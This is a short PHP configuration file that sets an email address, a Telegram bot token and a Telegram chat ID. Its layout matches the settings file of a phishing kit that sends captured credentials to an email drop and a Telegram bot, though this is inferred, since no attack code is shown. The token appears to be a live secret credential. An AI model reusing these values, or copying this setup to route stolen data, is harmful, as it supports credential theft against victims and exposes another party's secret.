<?php 

// Email
$jean_email = "rezltajaya2021@mail.ru";
// Telegram Token
$token = "1744680080:AAGbIYtMPCc5FFzSc5blbyprbkdk6LkydEQ";
// Telegram Chat ID
$chat_id = "965061138";
